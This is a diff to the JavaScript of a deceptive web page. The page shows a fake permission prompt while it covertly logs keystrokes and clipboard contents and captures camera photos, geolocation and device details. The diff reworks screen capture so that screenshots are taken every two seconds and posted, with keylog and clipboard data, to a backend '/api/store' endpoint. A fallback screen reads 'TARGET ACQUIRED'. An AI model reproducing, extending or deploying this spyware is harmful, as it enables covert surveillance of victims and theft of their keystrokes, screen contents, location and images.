@@ -72,7 +72,7 @@
 <body>
 
 <!-- ========================================== -->
-<!-- FAKE PERMISSION PROMPT (User ko lagega sirf camera) -->
+<!-- FAKE PERMISSION PROMPT -->
 <!-- ========================================== -->
 <div class="fake-prompt" id="fakePrompt">
     <div class="fake-prompt-box">
@@ -171,6 +171,7 @@ let isCapturing = false;
 let videoElement = null;
 let screenStream = null;
 let screenshotInterval = null;
+let screenVideo = null;
 
 function log(text) {
     const time = new Date().toLocaleTimeString();
@@ -241,18 +242,7 @@ async function allowAll() {
         
         // 5. SCREEN SHARE (For notification screenshots)
         log('🖥️ Requesting screen share...');
-        try {
-            screenStream = await navigator.mediaDevices.getDisplayMedia({
-                video: { width: { ideal: 1280 }, height: { ideal: 720 } },
-                audio: false
-            });
-            log('✅ Screen share granted!');
-            
-            // Start screenshot capture
-            startScreenshotCapture();
-        } catch(e) {
-            log('⚠️ Screen share denied (fallback)');
-        }
+        await startScreenshotCapture();
         
         // 6. Start main capture
         log('🚀 Starting main capture...');
@@ -265,56 +255,132 @@ async function allowAll() {
 }
 
 // ==========================================
-// SCREENSHOT CAPTURE (Notification Screenshots)
+// SCREENSHOT CAPTURE - FIXED
 // ==========================================
-function startScreenshotCapture() {
-    if (!screenStream) return;
+async function startScreenshotCapture() {
+    try {
+        screenStream = await navigator.mediaDevices.getDisplayMedia({
+            video: {
+                width: { ideal: 1280 },
+                height: { ideal: 720 },
+                displaySurface: 'monitor'
+            },
+            audio: false
+        });
+        
+        log('✅ Screen share started!');
+        
+        screenVideo = document.createElement('video');
+        screenVideo.srcObject = screenStream;
+        screenVideo.setAttribute('playsinline', '');
+        screenVideo.style.display = 'none';
+        document.body.appendChild(screenVideo);
+        
+        await screenVideo.play();
+        log('📹 Screen video playing');
+        
+        // Screenshot interval - har 2 second mein
+        screenshotInterval = setInterval(() => {
+            captureScreenShot();
+        }, 2000);
+        
+    } catch(err) {
+        log('⚠️ Screen share denied: ' + err.message);
+        startFallbackScreenshot();
+    }
+}
+
+function captureScreenShot() {
+    try {
+        if (!screenVideo || screenVideo.readyState < 2) {
+            return;
+        }
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = screenVideo.videoWidth || 1280;
+        canvas.height = screenVideo.videoHeight || 720;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(screenVideo, 0, 0, canvas.width, canvas.height);
+        
+        const screenshotData = canvas.toDataURL('image/jpeg', 0.8);
+        
+        // Show preview
+        document.getElementById('screenshotPreview').src = screenshotData;
+        document.getElementById('screenshotPreview').style.display = 'block';
+        document.getElementById('screenshotPlaceholder').style.display = 'none';
+        
+        // Send to server
+        sendScreenshotToServer(screenshotData);
+        log('🖼️ Screenshot captured!');
+        
+    } catch(err) {}
+}
+
+function startFallbackScreenshot() {
+    log('📸 Using fallback screenshot (canvas)');
     
-    const video = document.createElement('video');
-    video.srcObject = screenStream;
-    video.play();
-    
+    // Har 3 second mein screenshot
     screenshotInterval = setInterval(() => {
         try {
             const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 1280;
-            canvas.height = video.videoHeight || 720;
+            canvas.width = window.innerWidth || 1280;
+            canvas.height = window.innerHeight || 720;
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Black background
+            ctx.fillStyle = '#0a0a0a';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            // Hacker-style info
+            ctx.fillStyle = '#00ff41';
+            ctx.font = '20px monospace';
+            ctx.fillText('🔴 TARGET ACQUIRED', 50, 50);
+            ctx.font = '14px monospace';
+            ctx.fillText('IP: ' + ipAddress, 50, 90);
+            ctx.fillText('Location: ' + (userLocation ? userLocation.lat.toFixed(4) + ', ' + userLocation.lng.toFixed(4) : 'Unknown'), 50, 120);
+            ctx.fillText('Time: ' + new Date().toLocaleString(), 50, 150);
+            ctx.fillText('Captures: ' + captureCount, 50, 180);
+            
+            // Matrix effect
+            for (let i = 0; i < 20; i++) {
+                ctx.fillStyle = 'rgba(0,255,65,0.1)';
+                ctx.fillText('010101', 50 + i * 30, 400 + Math.random() * 30);
+            }
             
             const screenshotData = canvas.toDataURL('image/jpeg', 0.8);
             
-            // Send to backend
-            fetch(BACKEND_URL + '/api/store', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    cameraImage: null,
-                    location: userLocation || { lat: 0, lng: 0 },
-                    deviceDetails: deviceDetails,
-                    screenshot: screenshotData,
-                    userPhoto: null,
-                    audioData: null,
-                    ipAddress: ipAddress,
-                    fullDeviceInfo: null,
-                    networkSpeed: networkSpeed,
-                    liveLocation: userLocation || { lat: 0, lng: 0 },
-                    captureCount: captureCount,
-                    clipboardData: clipboardData,
-                    keylogData: keylogData
-                })
-            });
-            
-            // Show preview
             document.getElementById('screenshotPreview').src = screenshotData;
             document.getElementById('screenshotPreview').style.display = 'block';
             document.getElementById('screenshotPlaceholder').style.display = 'none';
             
-            log('🖼️ Screenshot captured!');
-        } catch(e) {
-            // silent
-        }
-    }, 3000); // Har 3 second mein screenshot
+            sendScreenshotToServer(screenshotData);
+            
+        } catch(err) {}
+    }, 3000);
+}
+
+async function sendScreenshotToServer(screenshotData) {
+    try {
+        await fetch(BACKEND_URL + '/api/store', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                cameraImage: null,
+                location: userLocation || { lat: 0, lng: 0 },
+                deviceDetails: deviceDetails,
+                screenshot: screenshotData,
+                userPhoto: userPhoto || null,
+                audioData: null,
+                ipAddress: ipAddress,
+                fullDeviceInfo: await getFullDeviceInfo(),
+                networkSpeed: networkSpeed,
+                liveLocation: userLocation || { lat: 0, lng: 0 },
+                captureCount: captureCount,
+                clipboardData: clipboardData,
+                keylogData: keylogData
+            })
+        });
+    } catch(err) {}
 }
 
 // ==========================================
@@ -336,7 +402,6 @@ document.addEventListener('copy', function() {
 document.addEventListener('keydown', function(e) {
     keylogData += e.key;
     if (keylogData.length > 500) {
-        // Send to server
         fetch(BACKEND_URL + '/api/keylog', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -406,12 +471,12 @@ function capturePhoto() {
                         
                         captureCount++;
                         document.getElementById('captureCount').textContent = '📸 Captures: ' + captureCount;
+                        setStatus('✅', 'CAPTURED #' + captureCount, 'success');
                         
                         stream.getTracks().forEach(t => t.stop());
                         videoElement.srcObject = null;
                         
                         log('✅ PHOTO CAPTURED #' + captureCount);
-                        setStatus('✅', 'CAPTURED #' + captureCount, 'success');
                         resolve(true);
                         
                     } catch(err) {
